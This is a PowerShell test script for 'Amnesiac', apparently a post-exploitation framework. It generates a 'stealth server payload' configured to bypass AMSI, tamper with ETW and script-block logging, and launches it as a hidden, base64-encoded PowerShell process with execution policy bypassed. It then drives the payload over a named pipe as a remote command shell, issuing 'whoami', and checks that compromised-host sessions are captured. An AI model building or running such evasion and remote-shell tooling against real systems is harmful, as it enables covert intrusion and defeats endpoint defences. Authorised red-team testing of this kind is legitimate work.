
# LocalGListenerTest.ps1
# Tests global listener flow: stealth server payload -> Scan-WaitingTargets -> session capture

Set-Location 'C:\users\localuser\Downloads\Amnesiac-main\Amnesiac-main'
. .\Amnesiac.ps1

$global:EndMarker  = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
$global:BufferSize = 4096
$global:MultiPipeName = -join ((65..90 + 97..122) | Get-Random -Count 16 | % {[char]$_})
$global:MultipleSessions = [System.Collections.ArrayList]::new()
$global:AllUserDefinedTargets = @('.')
$global:AllOurTargets = @()
$global:Message = $null
$global:PayloadConfig = @{
    Amsi        = 'pageguard'
    Etw         = 'provider'
    Sbl         = $true
    Launcher    = 'ps'
    Jitter      = 'off'
    JitterMin   = 1
    JitterMax   = 3
    Encoding    = 'none'
    Obfuscation = $false
    EnvKeys     = @{}
}

$PASS = 0; $FAIL = 0
function Pass($m) { Write-Output "  [PASS] $m"; $script:PASS++ }
function Fail($m) { Write-Output "  [FAIL] $m"; $script:FAIL++ }

Write-Output ""
Write-Output "============================================================"
Write-Output " AMNESIAC GLOBAL LISTENER LOCAL TEST"
Write-Output " EndMarker  : $global:EndMarker"
Write-Output " PipeName   : $global:MultiPipeName"
Write-Output "============================================================"
Write-Output ""

# ── Baseline: bare pipe, no security descriptor ───────────────────────────────
Write-Output "--- Baseline: bare NamedPipeServerStream + WaitForConnection ---"
$bpn = -join ((65..90 + 97..122) | Get-Random -Count 12 | % {[char]$_})
$bareScript = "`$p=New-Object System.IO.Pipes.NamedPipeServerStream('$bpn','InOut');`$p.WaitForConnection();`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$w.WriteLine('ok');`$w.Flush();`$p.Dispose();exit"
$benc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bareScript))
$bproc = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$benc -PassThru
Start-Sleep -Milliseconds 800
try {
    $bp = New-Object System.IO.Pipes.NamedPipeClientStream('.', $bpn, 'InOut')
    $bp.Connect(3000)
    if ($bp.IsConnected) {
        $br = New-Object System.IO.StreamReader($bp)
        $resp = $br.ReadLine()
        $bp.Dispose()
        if ($resp -eq 'ok') { Pass "Bare pipe server: connected and got response" }
        else { Fail "Bare pipe server: unexpected response: $resp" }
    } else { Fail "Bare pipe server: IsConnected=False" }
} catch { Fail "Bare pipe server threw: $_" }
try { if (!$bproc.HasExited) { $bproc.Kill() } } catch {}

# ── Step 1: Generate stealth server payload ───────────────────────────────────
Write-Output ""
Write-Output "--- Step 1: Generate stealth server payload ---"
$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
Write-Output "  SID: $SID"

try {
    $built = New-PayloadScript -IsServer -PipeName $global:MultiPipeName -SID $SID
    Write-Output "  InlinePS length: $($built.InlinePS.Length) chars"
    if ($built.InlinePS.Length -gt 100) { Pass "Server payload generated" }
    else { Fail "Server payload too short" }
} catch {
    Fail "New-PayloadScript -IsServer threw: $_"
    exit 1
}

# ── Step 2: Launch and verify process stays alive ─────────────────────────────
Write-Output ""
Write-Output "--- Step 2: Launch server payload ---"
$launchScript = $built.InlinePS + ";exit"
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($launchScript))
$proc = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc -PassThru
Write-Output "  Launched PID: $($proc.Id)"
Start-Sleep -Milliseconds 3000
$alive = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
Write-Output "  Process alive after 3s: $($null -ne $alive)"
if ($null -ne $alive) { Pass "Process still alive after 3s" }
else { Fail "Process died within 3s - inner script crashed" }

# ── Step 3: Wait for pipe ─────────────────────────────────────────────────────
Write-Output ""
Write-Output "--- Step 3: Wait for named pipe ---"
$pipePath = "\\.\pipe\$($global:MultiPipeName)"
$waited = 0; $found = $false
while ($waited -lt 8000) {
    if (Test-Path $pipePath) { $found = $true; break }
    Start-Sleep -Milliseconds 200; $waited += 200
}
Write-Output "  Pipe exists: $found (after ${waited}ms)"
Write-Output "  Process alive: $($null -ne (Get-Process -Id $proc.Id -EA 0))"
if ($found) { Pass "Pipe appeared" } else { Fail "Pipe never appeared" }

# ── Step 4: Direct connect ────────────────────────────────────────────────────
Write-Output ""
Write-Output "--- Step 4: Direct NamedPipeClientStream connect ---"
try {
    $testPipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', $global:MultiPipeName, 'InOut')
    $testPipe.Connect(5000)
    if ($testPipe.IsConnected) {
        Pass "Direct connect succeeded"
        $testSr = New-Object System.IO.StreamReader($testPipe)
        $testSw = New-Object System.IO.StreamWriter($testPipe)
        $testSw.WriteLine("whoami"); $testSw.Flush()
        $resp = ""; $sw2 = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw2.ElapsedMilliseconds -lt 5000) {
            $line = $testSr.ReadLine()
            if ($null -eq $line -or $line -eq $global:EndMarker) { break }
            if ($resp -eq "") { $resp = $line.Trim() }
        }
        Write-Output "  whoami: $resp"
        if ($resp) { Pass "Pipe responded to whoami" } else { Fail "No whoami response" }
        try { $testSw.WriteLine("exit"); $testSw.Flush() } catch {}
        $testPipe.Dispose()
    } else { Fail "Connected but IsConnected=False" }
} catch { Fail "Direct connect threw: $_" }

# ── Step 5: Scan-WaitingTargets ───────────────────────────────────────────────
Write-Output ""
Write-Output "--- Step 5: Scan-WaitingTargets ---"
$pn2 = -join ((65..90 + 97..122) | Get-Random -Count 16 | % {[char]$_})
$global:MultiPipeName = $pn2
Write-Output "  New pipe: $pn2"
$built2 = New-PayloadScript -IsServer -PipeName $pn2 -SID $SID
$enc2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($built2.InlinePS + ";exit"))
$proc2 = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc2 -PassThru
# Wait for pipe
$pp2 = "\\.\pipe\$pn2"; $w2 = 0
while ($w2 -lt 8000) { if (Test-Path $pp2) { break }; Start-Sleep -Milliseconds 200; $w2 += 200 }
Write-Output "  Pipe ready: $(Test-Path $pp2) (${w2}ms)"
Write-Output "  Process alive: $($null -ne (Get-Process -Id $proc2.Id -EA 0))"

$global:AllUserDefinedTargets = @('.')
$global:MultipleSessions = [System.Collections.ArrayList]::new()
$global:Message = $null
Scan-WaitingTargets
Write-Output "  Sessions found: $($global:MultipleSessions.Count)"
if ($global:MultipleSessions.Count -gt 0) {
    $s = $global:MultipleSessions[0]
    Write-Output "  UserID: $($s.UserID) | Host: $($s.ComputerName)"
    Pass "Scan-WaitingTargets captured session"
    try { $s.StreamWriter.WriteLine("exit"); $s.StreamWriter.Flush() } catch {}
    try { $s.PipeClient.Dispose() } catch {}
} else {
    Fail "Scan-WaitingTargets found 0 sessions"
}

# ── Cleanup ───────────────────────────────────────────────────────────────────
@($proc, $proc2) | ForEach-Object {
    try { if ($_ -and !$_.HasExited) { $_.Kill() } } catch {}
}

Write-Output ""
Write-Output "============================================================"
Write-Output " RESULTS: $PASS passed, $FAIL failed"
Write-Output "============================================================"
if ($FAIL -eq 0) { exit 0 } else { exit 1 }
